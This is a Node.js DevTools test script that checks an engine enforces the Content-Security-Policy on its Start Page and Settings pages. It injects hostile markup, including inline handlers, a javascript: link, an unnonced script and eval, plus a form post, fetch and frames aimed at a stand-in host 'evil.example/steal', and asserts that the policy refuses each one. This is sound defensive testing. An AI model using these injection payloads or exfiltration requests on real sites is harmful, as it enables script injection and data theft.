// The Content-Security-Policy of Aviary's own pages, in the real engine (23 Oct 2026; src/Aviary/PageCsp.cs).
// The unit tests prove the policy text and that the templates carry no inline handlers; this proves the engine
// enforces it and that nothing the pages legitimately do is refused. DevTools only: nothing is clicked or typed
// on the desktop.
//
//   CDP_PORT=9611 node csp-live.js
//
// For the Start Page and Settings: the page reloads with a securitypolicyviolation listener installed first,
// every Settings section is opened, and the run fails on any violation, uncaught exception or console error.
// Then hostile markup is injected into each page (an inline handler, an unnonced script, a javascript: link,
// a form post, a request to another host) and every one must be refused by the policy.
const PORT = process.env.CDP_PORT || 9222;
let failed = 0, passed = 0;
const check = (name, ok, extra) => { (ok ? passed++ : failed++); console.log((ok ? 'PASS  ' : 'FAIL  ') + name + (extra ? '  -- ' + extra : '')); };
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function target(match) {
  const list = (await (await fetch(`http://127.0.0.1:${PORT}/json/list`)).json()).filter(t => t.type === 'page');
  return list.find(t => (t.title || '').includes(match) || (t.url || '').includes(match));
}

function connect(t) {
  const ws = new WebSocket(t.webSocketDebuggerUrl);
  let id = 0; const waits = new Map(), events = [];
  ws.onmessage = m => {
    const d = JSON.parse(m.data);
    if (d.id && waits.has(d.id)) { const w = waits.get(d.id); waits.delete(d.id); d.error ? w.rej(new Error(d.error.message)) : w.res(d.result); }
    else if (d.method) events.push(d);
  };
  const ready = new Promise((res, rej) => { ws.onopen = res; ws.onerror = rej; });
  const send = (method, params = {}) => new Promise((res, rej) => { const i = ++id; waits.set(i, { res, rej }); ws.send(JSON.stringify({ id: i, method, params })); });
  // allowUnsafeEvalBlockedByCSP:false - DevTools would otherwise let the evaluated code call eval() whatever the page's policy says.
  const evaluate = async expr => { const r = await send('Runtime.evaluate', { expression: expr, awaitPromise: true, returnByValue: true, allowUnsafeEvalBlockedByCSP: false }); if (r.exceptionDetails) throw new Error(r.exceptionDetails.text + ' ' + (r.exceptionDetails.exception?.description || '')); return r.result.value; };
  return { ready, send, evaluate, events, close: () => ws.close() };
}

const WATCH = `(function(){ window.__csp = []; document.addEventListener('securitypolicyviolation', function(e){ window.__csp.push(e.violatedDirective + ' | ' + e.blockedURI + ' | ' + (e.sample || '').slice(0, 40)); }); })();`;

async function run(label, match, perPage) {
  const t = await target(match);
  if (!t) { check(`${label}: page is open`, false, 'no target "' + match + '"'); return; }
  const c = connect(t); await c.ready;
  await c.send('Runtime.enable'); await c.send('Log.enable'); await c.send('Page.enable');
  await c.send('Log.clear'); await sleep(300);
  c.events.length = 0; // Log.enable replays what an earlier run left in the target's log: only what this reload produces counts
  await c.send('Page.addScriptToEvaluateOnNewDocument', { source: WATCH });
  await c.send('Page.reload', { ignoreCache: true });
  await sleep(2500);

  const policy = await c.evaluate(`(document.querySelector('meta[http-equiv="Content-Security-Policy"]')||{}).content || ''`);
  const nonceMeta = /script-src 'nonce-([^']+)'/.exec(policy)?.[1];
  check(`${label}: the page carries the policy and a nonce`, !!nonceMeta && policy.startsWith("default-src 'none'"), policy.slice(0, 60));
  const scriptNonce = await c.evaluate(`(function(){ var s = document.querySelector('script'); return s ? s.nonce : ''; })()`);
  check(`${label}: the page's script carries the nonce the policy names`, !!nonceMeta && scriptNonce === nonceMeta);
  const content = await c.evaluate(`document.body.innerText.length`);
  check(`${label}: the page rendered (${content} characters)`, content > 200);

  await perPage(c);

  const violations = await c.evaluate(`window.__csp.slice()`);
  const errors = c.events.filter(e => (e.method === 'Runtime.exceptionThrown') || (e.method === 'Log.entryAdded' && e.params.entry.level === 'error' && e.params.entry.source !== 'network') || (e.method === 'Runtime.consoleAPICalled' && e.params.type === 'error'));
  check(`${label}: nothing the page does is refused by its own policy`, violations.length === 0, violations.slice(0, 3).join(' ; '));
  check(`${label}: no uncaught exception or console error`, errors.length === 0, errors.slice(0, 2).map(e => JSON.stringify(e.params).slice(0, 200)).join(' ; '));

  // Hostile markup: each attempt must be refused, and the proof that it did not run is a flag that stays unset.
  await c.evaluate(`window.__csp.length = 0; window.__pwn = []; true`);
  await c.evaluate(`(function(){
    var host = document.createElement('div'); host.id = '__attack'; document.body.appendChild(host);
    host.innerHTML = '<img src="data:image/gif;base64,AAAA" onerror="window.__pwn.push(\\'handler\\')">' +
                     '<a id="__js" href="javascript:window.__pwn.push(\\'javascript-url\\')">x</a>' +
                     '<form id="__form" action="https://evil.example/steal" method="post"><input name="a" value="b"></form>' +
                     '<iframe src="https://evil.example/"></iframe><object data="https://evil.example/x"></object>' +
                     '<img src="https://evil.example/pixel.gif">';
    var s = document.createElement('script'); s.textContent = 'window.__pwn.push("unnonced-script")'; document.body.appendChild(s);
    try { eval('window.__pwn.push("eval")'); } catch (e) {}
    try { new Function('window.__pwn.push("function")')(); } catch (e) {}
    try { setTimeout('window.__pwn.push("timer-string")', 0); } catch (e) {}
    try { document.getElementById('__js').click(); } catch (e) {}
    try { fetch('https://evil.example/x').catch(function(){}); } catch (e) {}
    try { document.getElementById('__form').submit(); } catch (e) {}
    return true; })()`);
  await sleep(1200);
  const pwn = await c.evaluate(`window.__pwn.slice()`);
  const refused = await c.evaluate(`window.__csp.map(function(v){ return v.split(' | ')[0]; })`);
  check(`${label}: injected code does not run`, pwn.length === 0, pwn.join(','));
  const want = ['script-src-attr', 'script-src-elem', 'script-src', 'img-src', 'frame-src', 'object-src', 'form-action', 'connect-src'];
  const seen = new Set(refused);
  for (const d of want) check(`${label}: the engine refused a ${d} attempt`, seen.has(d), [...seen].join(','));
  await c.evaluate(`document.getElementById('__attack') && document.getElementById('__attack').remove(); true`);
  c.close();
}

(async () => {
  await run('Start Page', 'Aviary', async c => {
    const tiles = await c.evaluate(`document.querySelectorAll('.tile, section').length`);
    check('Start Page: its sections are drawn', tiles > 0, tiles + ' elements');
    // The picture-failure fallback used to be an onerror attribute: prove the delegated listener still does it.
    const swapped = await c.evaluate(`(function(){
      var well = document.createElement('span'); well.className = 'tile__well'; document.body.appendChild(well);
      well.innerHTML = '<img src="https://aviary.localhost/icon/none/none" data-mono="Zq" data-hue="2" alt="">';
      return new Promise(function(res){ setTimeout(function(){ var m = well.querySelector('.tile__mono'); var ok = !!m && m.textContent === 'Zq' && !well.querySelector('img'); well.remove(); res(ok); }, 1500); }); })()`);
    check('Start Page: a failed icon falls back to its monogram', swapped === true);
    const dropped = await c.evaluate(`(function(){
      var well = document.createElement('span'); document.body.appendChild(well);
      well.innerHTML = '<img src="https://aviary.localhost/icon/none/none2" data-drop="1" alt="">';
      return new Promise(function(res){ setTimeout(function(){ var ok = !well.querySelector('img'); well.remove(); res(ok); }, 1500); }); })()`);
    check('Start Page: a failed thumbnail is dropped', dropped === true);
  });

  await run('Settings', 'Settings', async c => {
    const sections = await c.evaluate(`Array.prototype.map.call(document.querySelectorAll('#nav button'), function(b){ return b.textContent.trim(); })`);
    check(`Settings: ${sections.length} sections listed`, sections.length >= 12, sections.join(', ').slice(0, 120));
    let drawn = 0;
    for (let i = 0; i < sections.length; i++) {
      await c.evaluate(`document.querySelectorAll('#nav button')[${i}].click(); true`);
      await sleep(350);
      const on = await c.evaluate(`(function(){ var p = document.querySelector('.pane.on'); return p ? p.innerText.length : 0; })()`);
      if (on > 20) drawn++;
    }
    check(`Settings: every section draws (${drawn} of ${sections.length})`, drawn === sections.length);
  });

  console.log(failed ? `\n${failed} check(s) failed, ${passed} passed` : `\nall ${passed} CSP live checks passed`);
  process.exit(failed ? 1 : 0);
})().catch(e => { console.error(e); process.exit(1); });
